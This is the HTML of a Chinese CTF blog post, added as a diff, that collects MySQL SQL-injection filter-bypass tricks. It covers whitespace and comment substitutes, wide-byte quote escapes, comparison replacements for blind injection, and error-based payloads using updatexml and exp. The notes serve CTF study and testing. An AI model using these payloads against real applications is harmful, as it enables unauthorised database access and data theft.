@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="lexsd6" />
+
+
+
+<meta name="description" content="最近，在比赛发现之前整理sql注入的笔记有点乱，有bypass姿势有点不好找。于是写了篇文章来整理下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于sql注入bypass总结">
+<meta property="og:url" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="lexsd6&#39;s home">
+<meta property="og:description" content="最近，在比赛发现之前整理sql注入的笔记有点乱，有bypass姿势有点不好找。于是写了篇文章来整理下。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210131205441717.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210131211724609.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210201164131405.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210201112258586.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210201113138887.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210201113747738.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210201113531721.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210201115111398.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210201115204131.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210201165236647.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210201171432062.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210201171912552.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210201123229303.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210201184708338.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210201184758057.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210201190835425.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210201190937713.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210201191659765.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210201191809029.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210201192553328.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210131195902194.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210131200812789.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210131195818399.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210201201149269.png">
+<meta property="og:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210201173229186.png">
+<meta property="article:published_time" content="2021-01-31T10:51:08.237Z">
+<meta property="article:modified_time" content="2021-02-01T12:22:21.668Z">
+<meta property="article:author" content="lexsd6">
+<meta property="article:tag" content="mysql">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/image-20210131205441717.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="lexsd6&#39;s home" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/title.ico">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>关于sql注入bypass总结 | lexsd6&#39;s home</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/lexsd6.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">lexsd6</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle"> Clumsy birds have to start flying early</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:lexsd6@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" href="tencent://message/?uin=2927507170&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/" rel="tag">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ida/" rel="tag">ida</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/libc/" rel="tag">libc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mics/" rel="tag">mics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/node-js/" rel="tag">node-js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/problem-resolve/" rel="tag">problem-resolve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/problem-resolve/" rel="tag">problem_resolve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/" rel="tag">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/translate/" rel="tag">translate</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/" target="_blank" rel="noopener">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/" target="_blank" rel="noopener">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">一梦想成为五边形战士的老菜鸡</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">lexsd6</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/lexsd6.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">lexsd6</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle"> Clumsy birds have to start flying early</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:lexsd6@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="tencent://message/?uin=2927507170&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-关于sql注入bypass总结" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/" class="article-date">
+      <time datetime="2021-01-31T10:51:08.237Z" itemprop="datePublished">2021-01-31</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      关于sql注入bypass总结
+    </h1>
+  
+
+
+          <div style="margin-top:10px ;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">2k字</span>
+      </span>
+    </span>
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">阅读时长:</span>
+        <span class="post-count">8分</span>
+      </span>
+    </span>
+</div>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+          
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud" >
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li></ul>
+
+    </div>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>最近，在比赛发现之前整理sql注入的笔记有点乱，有bypass姿势有点不好找。于是写了篇文章来整理下。</p>
+<a id="more"></a>
+<h2 id="中间件过滤绕过"><a href="#中间件过滤绕过" class="headerlink" title="中间件过滤绕过"></a>中间件过滤绕过</h2><p>1.大小写绕过</p>
+<p>2.双写绕过</p>
+<p>3.编码绕过</p>
+<p>4.字符替换绕过</p>
+<h2 id="方法替换绕过"><a href="#方法替换绕过" class="headerlink" title="方法替换绕过"></a>方法替换绕过</h2><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>1.在纯mysql下，我们可以用<code>/**/</code>来代替空格。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select&#x2F;**&#x2F;database();</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210131205441717.png" alt="image-20210131205441717"></p>
+<p>2.我们还可以用<code>+</code>来代替空格。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select+database();</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210131211724609.png" alt="image-20210131211724609"></p>
+<p>3.在有php中间件下，我们用<code>%09</code>、<code>%0A</code>、 <code>%0B</code>、 <code>%0C</code>、 <code>%0D</code>、<code>%A0</code>、<code>%20</code>这些url字符来绕过空格。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>%<span class="number">09</span><span class="keyword">database</span>();</span><br></pre></td></tr></table></figure>
+
+<p>4.<code>and/or</code>后面可以跟上偶数个<code>!</code>、<code>~</code>可以替代空格，也可以混合使用(规律又不同)，<code>and/or</code>前的空格可用省略.</p>
+<p>5.用<code>()</code>来传递参数。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">'admin'</span><span class="keyword">union</span>(<span class="keyword">select</span>+title,<span class="keyword">content</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/*!article*/</span><span class="keyword">where</span><span class="comment">/**/</span><span class="keyword">id</span>=<span class="string">'1'</span><span class="keyword">and</span>!!!!~~<span class="number">1</span>=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>6.对于字符串参数可以利用 引号和反引号还传递参数。</p>
+<p>7.由于<code>&lt;&gt;</code> 等价于 <code>!=</code>,我们可以再加一个<code>!</code>来构成<code>=</code>的效果.</p>
+<p><img src="image-20210201164131405.png" alt="image-20210201164131405"></p>
+<p>8.符号、字母与数字间的空格可以适当省略。</p>
+<p><img src="image-20210201112258586.png" alt="image-20210201112258586"></p>
+<h3 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h3><p>在sql中，注释符有：两种单行注释符和多行注释。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#， </span></span><br><span class="line"><span class="comment">-- X(X为任意字符)</span></span><br><span class="line"><span class="comment">/*(MySQL-5.1)</span></span><br><span class="line"><span class="comment">;%00</span></span><br><span class="line"><span class="comment">`</span></span><br><span class="line"><span class="comment">'or 1=1;%00</span></span><br><span class="line"><span class="comment">'or 1=1 union select 1,2`'</span></span><br><span class="line"><span class="comment">'or 1=1 # </span></span><br><span class="line"><span class="comment">'/*!50000or*/</span> 1=1 <span class="comment">-- -      //版本号为5.1.38时只要小于50138</span></span><br><span class="line">'<span class="comment">/*!or*/</span> 1=1 <span class="comment">-- -</span></span><br></pre></td></tr></table></figure>
+
+<p>若<code>#</code> 、<code>-</code>同时被ban。可以使用逻辑符与引号转字符串绕过。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>||<span class="string">'x</span></span><br><span class="line"><span class="string">#这样  x 所在的位置及以后的内容就变成字符串，加上 `||` 作用就起了等同于注释的作用</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="数字与大写字母绕过"><a href="#数字与大写字母绕过" class="headerlink" title="数字与大写字母绕过"></a>数字与大写字母绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">false !pi()           0     ceil(pi()*pi())           10 A      ceil((pi()+pi())*pi()) 20       K</span><br><span class="line">true !!pi()           1     ceil(pi()*pi())+true      11 B      ceil(ceil(pi())*version()) 21   L</span><br><span class="line">true+true             2     ceil(pi()+pi()+version()) 12 C      ceil(pi()*ceil(pi()+pi())) 22   M</span><br><span class="line">floor(pi())           3     floor(pi()*pi()+pi())     13 D      ceil((pi()+ceil(pi()))*pi()) 23 N</span><br><span class="line">ceil(pi())            4     ceil(pi()*pi()+pi())      14 E      ceil(pi())*ceil(version()) 24   O</span><br><span class="line">floor(version())      5     ceil(pi()*pi()+version()) 15 F      floor(pi()*(version()+pi())) 25 P</span><br><span class="line">ceil(version())       6     floor(pi()*version())     16 G      floor(version()*version()) 26   Q</span><br><span class="line">ceil(pi()+pi())       7     ceil(pi()*version())      17 H      ceil(version()*version()) 27    R</span><br><span class="line">floor(version()+pi()) 8     ceil(pi()*version())+true 18 I      ceil(pi()*pi()*pi()-pi()) 28    S</span><br><span class="line">floor(pi()*pi())      9     floor((pi()+pi())*pi())   19 J      floor(pi()*pi()*floor(pi())) 29 T</span><br></pre></td></tr></table></figure>
+
+<h3 id="等号绕过"><a href="#等号绕过" class="headerlink" title="等号绕过"></a>等号绕过</h3><p>我们可以用LIKE 替代。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id =  'USER'</span><br><span class="line">id LIKE 'USER'</span><br></pre></td></tr></table></figure>
+
+<h3 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h3><p>在对于<code>substr()</code>和<code>mid()</code>这两个方法可以使用<code>from to</code>的方式来解决：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="comment">#等效于</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>() ,<span class="number">1</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210201113138887.png" alt="image-20210201113138887"></p>
+<p>在对于limit可以使用offset来绕过：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> books  <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">#等效于</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> books  <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210201113747738.png" alt="image-20210201113747738"></p>
+<p>在对于select可以使用jion来绕过：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b;</span><br><span class="line"> <span class="comment">#等效于</span></span><br><span class="line"> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210201113531721.png" alt="image-20210201113531721"></p>
+<h3 id="大于小于符号绕过"><a href="#大于小于符号绕过" class="headerlink" title="大于小于符号绕过"></a>大于小于符号绕过</h3><h4 id="greatest-amp-amp-least"><a href="#greatest-amp-amp-least" class="headerlink" title="greatest&amp;&amp;least"></a>greatest&amp;&amp;least</h4><p>我们可以用<code>greatest()</code> 与<code>least()</code> 。</p>
+<p> <code>greatest(a,b)</code>返回a与b中较大的那个值。</p>
+<p><img src="image-20210201115111398.png" alt="image-20210201115111398"></p>
+<p> <code>least(a,b)</code>返回a与b中较小的那个值。</p>
+<p><img src="image-20210201115204131.png" alt="image-20210201115204131"></p>
+<p>因此一个盲注sql语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>))&gt;<span class="number">64</span>;</span><br></pre></td></tr></table></figure>
+
+<p>可以替代成为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">greatest</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)=<span class="number">64</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h4><p>strcmp(str1,str2):若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1.</p>
+<p><img src="image-20210201165236647.png" alt="image-20210201165236647"></p>
+<h4 id="in关键字"><a href="#in关键字" class="headerlink" title="in关键字"></a>in关键字</h4><p>in关键字可以用来判断前一字符串中是否有某一字符.</p>
+<p><img src="image-20210201171432062.png" alt="image-20210201171432062"></p>
+<h4 id="between-a-and-b"><a href="#between-a-and-b" class="headerlink" title="between a and b"></a>between a and b</h4><p>between a and b 来判断范围是否在a-b之间</p>
+<p><img src="image-20210201171912552.png" alt="image-20210201171912552"></p>
+<h3 id="逻辑符号与关键词替代绕过"><a href="#逻辑符号与关键词替代绕过" class="headerlink" title="逻辑符号与关键词替代绕过"></a>逻辑符号与关键词替代绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在sql中：</span><br><span class="line">and等效&amp;&amp;  </span><br><span class="line">or等效||   </span><br><span class="line">xor等效|   </span><br><span class="line">not等效!</span><br></pre></td></tr></table></figure>
+
+<h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><h4 id="使用十六进制"><a href="#使用十六进制" class="headerlink" title="使用十六进制"></a>使用十六进制</h4><p><img src="image-20210201123229303.png" alt="image-20210201123229303"></p>
+<h4 id="用宽字节绕过"><a href="#用宽字节绕过" class="headerlink" title="用宽字节绕过"></a>用宽字节绕过</h4><p>当我们输入的数据为：<code>username=%df%27or%201=1%23&amp;password=123</code></p>
+<p>经过addslashes函数处理最终变成：<code>username=%df%5c%27or%201=1%23&amp;password=123</code></p>
+<p>经过gbk解码得到<code>：username=運&#39;or 1=1#、password=123</code>，拼接到SQL语句得：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username = <span class="string">'運'</span><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#' and password='123';</span></span><br></pre></td></tr></table></figure>
+
+<p>从而绕过引号.</p>
+<h3 id="sleep绕过"><a href="#sleep绕过" class="headerlink" title="sleep绕过"></a>sleep绕过</h3><h3 id="报错注入函数替代"><a href="#报错注入函数替代" class="headerlink" title="报错注入函数替代"></a>报错注入函数替代</h3><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>payload：<code>exp(~(select * from(select user())a))</code></p>
+<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><p>payload：<code>updatexml(1,concat(0x7e,(select user()),0x7e),1)</code></p>
